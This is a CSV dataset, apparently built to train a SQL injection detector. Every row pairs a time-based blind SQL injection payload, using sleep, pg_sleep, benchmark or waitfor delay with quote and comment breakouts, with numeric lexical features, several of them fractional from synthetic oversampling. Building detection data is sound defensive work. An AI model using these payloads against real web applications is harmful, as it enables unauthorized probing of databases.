id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000745,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000038,0.16920859677267622,78.50828808671487,20.93853601083936,3.0526263936288753,27.938536010839357,1.9692680054196803,38.66194805961648,9.93853601083936,0.35622107261970926,0.02502623995473678,0.4921580593385215,0.12659462808703248,0.0,1.0614639891606403,0.0,0.0,0.9692680054196798,0.0,0.0,7.907804016259039,0.0,0.0,0.0,0.96926800541968,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9692680054196798,0.0,0.0,0.96926800541968,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.93853601083936
SMOTE_000746,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000021,0.9954117932835722,63.61942333877095,25.714567504078214,3.8479691498730424,22.809711669385475,10.0,21.09514416530726,9.714567504078214,0.3584830234502444,0.15724108505528397,0.3317920147045507,0.15248387678992087,2.809711669385476,0.0,0.19028833061452427,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.09514416530726214,0.904855834692738,0.0,1.0,1.0,0.0,0.0,0.0,0.904855834692738,0.9048558346927379,0.0,1.0,0.0,0.9048558346927379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8097116693854756
SMOTE_000747,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000030,1.269454233282178,92.29171738982029,24.0,3.007958562603305,30.0,2.0,47.47553196808729,12.816185421732992,0.327820704398299,0.02185471362655328,0.5117783497388725,0.1385462322362752,1.0,0.0,0.0,0.0,1.0,0.0,0.0,9.81618542173299,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000748,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000058,0.5517894143602438,73.78872425780594,26.57744851561188,3.8032974932616472,18.78872425780594,21.68308638670891,25.31691361329109,8.0,0.2545757947033271,0.29376810415629295,0.34323076218813664,0.10842533895224334,0.0,0.0,1.7887242578059406,0.0,0.0,1.0,0.0,4.10563787109703,0.0,0.0,1.0,2.7887242578059404,0.0,0.0,0.8943621289029703,0.10563787109702968,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.8943621289029703,0.10563787109702971,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000749,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,1.5862860689867655,75.86982318744617,24.0,3.491540497932405,17.0,19.0,30.481030860249785,9.388792327196382,0.22685346121339361,0.253542103709087,0.39651113183361203,0.12309330324390738,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.388792327196383,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000750,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,0.701640664103102,67.34851433057152,25.67425716528576,3.5996459949224384,22.511385747928635,10.0,27.83712858264288,7.0,0.3340437502886035,0.1485558034683559,0.4134113838151915,0.10398906242784912,0.0,0.16287141735712118,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.16287141735712113,0.0,0.8371285826428787,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.16287141735712118,0.8371285826428788,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000751,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,0.6759727326131656,64.30175268767304,24.41812723972754,3.867221779721021,23.0,10.952629031509568,21.116374552054495,9.232749104108985,0.35803381699700654,0.16904820203286713,0.32887289164078437,0.144045089329342,2.349123656163477,0.0,1.7672508958910151,0.0,0.0,1.0,0.0,2.1163745520544923,0.0,0.0,0.0,2.767250895891015,1.0,0.0,0.8836254479455076,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8836254479455076,0.0,0.11637455205449243,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000752,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,1.3874433357331126,81.11201560158167,26.622403120316335,3.810595480707222,20.27800390039542,24.244806240632673,27.933604680474502,8.655600780079084,0.25,0.2973794331438786,0.3450529317904923,0.10756763506562905,0.0,1.0,0.0,0.0,0.0,1.6556007800790842,0.0,4.0,0.0,0.0,1.0,1.6556007800790842,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.655600780079084,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.655600780079084
SMOTE_000753,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.5733464158624717,82.9339975274189,20.12399929354826,2.888243291275386,27.603332744623547,1.5206665489247086,42.76866513602123,11.041333097849419,0.3343921773338445,0.017854539127114738,0.513996412605503,0.1337568709335378,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.041333097849419,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000754,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,2.3646746070127587,65.39969924222308,18.572740943535315,2.9874871901045568,20.718222830605946,1.4272590564646848,33.11792207282902,10.136295282323427,0.3290812946852164,0.021182877271016323,0.4967058505088938,0.15302997753487346,3.427259056464685,0.0,0.0,0.0,0.0,1.0,0.0,5.709036225858741,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5727409435353146,0.0,0.0,0.0,1.4272590564646854,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000755,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,2.4984019115775133,60.955216187242385,23.716412140431792,3.713796153316598,21.477608093621193,10.0,21.761195953189404,7.716412140431791,0.35223878793884933,0.1641791245123896,0.35746276069584154,0.12611932685291946,1.4776080936211942,0.0,1.522391906378806,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.761195953189403,0.23880404681059714,0.0,1.0,1.0,0.0,0.0,0.0,0.23880404681059716,0.23880404681059708,0.0,1.0,0.0,0.23880404681059703,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.477608093621194
SMOTE_000756,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,1.3538134900908327,83.22554229406856,21.548915411862883,3.0349087894450726,30.0,2.0,40.83831344110284,10.38722885296572,0.36051593077496275,0.02403439538499752,0.4905553938301044,0.12489428000993538,0.3872288529657204,0.0,0.0,0.0,1.0,0.0,0.0,8.61277114703428,0.0,0.0,0.0,1.0,0.3872288529657203,0.0,0.0,0.3872288529657203,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000757,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,0.27134432291975286,73.736014775827,17.496004221664858,2.8636972052935956,25.413336851387385,1.082667370277477,37.07467581360719,10.165334740554952,0.3451851678471052,0.014518523877561432,0.5022222411364913,0.13807406713884207,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.165334740554954,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000758,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,0.554284457377993,88.2175621201272,28.0,3.872876298754492,26.0,21.217562120127205,30.0,11.0,0.2947323014398229,0.24049753090507184,0.3400757324305648,0.12469443522454045,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.217562120127204,0.7824378798727961,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000759,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,1.2940984576292567,88.83851213503735,24.0,3.065774912700025,30.0,2.0,44.63171587591311,12.206796259124237,0.3405819950663808,0.02270546633775873,0.4996426125349123,0.1370699260609481,1.0,0.0,0.0,0.0,1.0,0.0,0.0,9.206796259124237,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000760,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.06857295962794291,82.25230473740866,23.977063205690122,3.1741887685256813,30.0,2.0,39.22936794309879,11.022936794309878,0.3648611143296276,0.024324074288641848,0.47678577059732,0.13402904078441055,0.9770632056901215,0.0,0.0,0.0,1.0,0.0,0.0,8.045873588619758,0.0,0.0,0.0,1.0,0.9770632056901215,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000761,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,0.022617008619604993,91.98015571103183,28.993385237010607,3.7656180300384103,30.966926185053033,15.04630334092575,34.96692618505303,11.0,0.3366600368811545,0.16360009424764188,0.3801479920785009,0.11959187679270274,3.0066147629893933,0.0,0.0,0.0,0.0,1.006614762989393,0.0,5.986770474021214,0.0,0.0,1.0,1.006614762989393,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.993385237010607,0.0,0.0,0.0,1.006614762989393,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000762,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,1.713524612181772,69.82374946648692,21.62230260349931,3.309108645237238,15.0,14.97842082799449,30.6007234314938,9.244605206998623,0.21890814106643447,0.2105935766589367,0.4375835697188687,0.13291471255576012,0.0,0.0,2.0,0.0,0.0,1.6223026034993113,0.0,4.622302603499311,0.0,0.0,1.0,3.6223026034993113,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6223026034993112,0.0,0.3776973965006888,0.6223026034993111,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6223026034993113
SMOTE_000763,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,1.7801613126168465,90.05253183693408,28.51313295923352,3.8154258085592527,28.565664796167592,17.921202244598888,32.565664796167596,11.0,0.31675057735949386,0.19984716266663619,0.3611910260566608,0.12221123391720914,3.486867040766481,0.0,0.0,0.0,0.0,1.4868670407664812,0.0,5.026265918467038,0.0,0.0,1.0,1.4868670407664812,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.5131329592335188,0.0,0.0,0.0,1.0,0.48686704076648113,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000764,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,1.1316000068047358,87.81618057111862,21.0176481522983,2.9309891693786545,30.0,2.0,44.798532418820315,11.017648152298298,0.34337597196566155,0.022891731464377438,0.5089943649824344,0.12473793158752655,0.25441203807457446,0.0,0.0,0.0,1.0,0.0,0.0,9.50882407614915,0.0,0.0,0.0,1.0,0.2544120380745746,0.0,0.0,0.25441203807457463,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000765,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,1.9717509697892432,88.0,27.595303258564186,3.877617756699488,21.190606517128376,27.80939348287162,30.0,9.0,0.24080234678554974,0.3160158350326321,0.3409090909090909,0.10227272727272728,0.0,0.5953032585641884,0.8093934828716232,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.809393482871623,0.0,0.5953032585641884,0.4046967414358116,0.5953032585641884,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000766,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,1.8807649265354107,66.06467913780256,23.38308489222532,3.4546700406069624,19.0,10.0,28.532339568901275,8.532339568901275,0.28856943804644564,0.15187865160339245,0.4316546067784734,0.12789730357168846,0.0,1.0,0.7661697844506379,0.0,0.0,1.0,0.0,4.383084892225319,0.3830848922253189,1.0,0.0,1.7661697844506379,0.0,1.0,0.38308489222531894,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000767,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000051,0.4250697911503402,85.60827025881623,19.371139290496053,2.882388484576113,27.123713096832017,2.0,44.23713096832017,12.247426193664037,0.31737464447052666,0.023414759386643044,0.5161712543212809,0.14303934182154934,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.247426193664035,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.12371309683201781,0.8762869031679821,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000768,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.6893017716616576,76.23575990661155,27.588080031129486,3.7442607093754448,18.88343978209361,18.528480186776903,28.411919968870517,10.411919968870516,0.24692065387200615,0.24387778734520094,0.37269961030430176,0.13650194847849115,0.0,1.8238399377410315,0.0,0.0,0.0,1.0,0.0,5.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.5880800311294843,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.4119199688705158,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4119199688705155
SMOTE_000769,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.13042999993398033,55.275045202938436,22.793716097796175,3.7710059368044733,23.0,3.931238699265391,17.343806503673044,11.0,0.41623234524881847,0.07122278818115339,0.31347722319015836,0.1990676433798697,5.931238699265391,0.0,0.0,0.0,0.0,1.0,0.0,2.0687613007346086,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000770,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,2.6284034613588525,91.17845046670354,21.05098584762958,3.0803203960936316,29.563732309536974,6.10197169525916,44.02549292381479,11.487253538092604,0.32404462480565,0.06392234225806152,0.4848722103416169,0.12716082259467157,0.0,0.48725353809260485,0.0,0.0,1.0,0.5127464619073951,0.0,8.487253538092604,0.0,0.0,0.0,1.5127464619073951,0.0,0.4872535380926048,0.0,1.0,0.0,0.5127464619073951,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.5127464619073951,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.512746461907395
SMOTE_000771,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,2.307790157841166,72.67533700502592,18.0,2.695324690286223,14.266966226689709,6.733033773310289,40.450224670017285,11.22511233500864,0.19379263518883405,0.0962144110568842,0.5561877919063931,0.1538051618478887,1.6334831133448549,0.0,0.0,0.0,0.0,1.0,0.0,7.408370778336214,0.0,0.0,0.5916292216637864,1.0,0.40837077833621366,0.0,0.0,0.5916292216637864,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4083707783362138,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.408370778336214
SMOTE_000772,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,1.373694467355949,65.41254617792332,20.726454740210126,3.370632410164938,25.726454740210126,3.219727523127303,26.973091131668713,9.49327278291718,0.39640273607223087,0.04178492077499253,0.41497482000406205,0.1468375231487146,3.246636391458589,0.0,0.0,0.0,0.0,1.2466363914585892,0.0,4.0,0.0,1.0,0.0,1.2466363914585892,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.2466363914585893,1.2466363914585892,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4932727829171784
SMOTE_000773,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000048,2.372487359470662,63.245854198348155,17.24585419834815,2.7464791730942397,16.393656107433316,1.6229270991740758,33.73756259504446,11.491708396696305,0.26033212860312654,0.025548292830253172,0.5328511227173165,0.18126845584930382,0.0,3.6229270991740763,0.0,0.0,0.0,1.0,0.0,5.622927099174076,1.2458541983481526,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3770729008259239,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.377072900825924
SMOTE_000774,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,0.890389176914185,67.49140378394398,25.49140378394398,3.603750254953157,22.321871711925304,10.0,27.830467927981328,7.339064144037347,0.33044909261995686,0.14820949370148423,0.41237839664079157,0.10896301703776735,0.0,0.1695320720186736,0.33906414403734725,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.3390641440373472,0.0,0.1695320720186736,0.16953207201867362,0.8304679279813264,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000775,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,2.2261688122968537,62.70763532495133,16.707635324951333,2.7928307977393647,18.815641037719,1.3538176624756666,32.122905974854,10.415270649902666,0.30115971955384296,0.021479097718886078,0.5116913081382076,0.16566987458906335,0.0,3.3538176624756666,0.0,0.0,0.0,1.0,0.0,5.353817662475667,0.7076353249513331,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6461823375243335,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6461823375243334
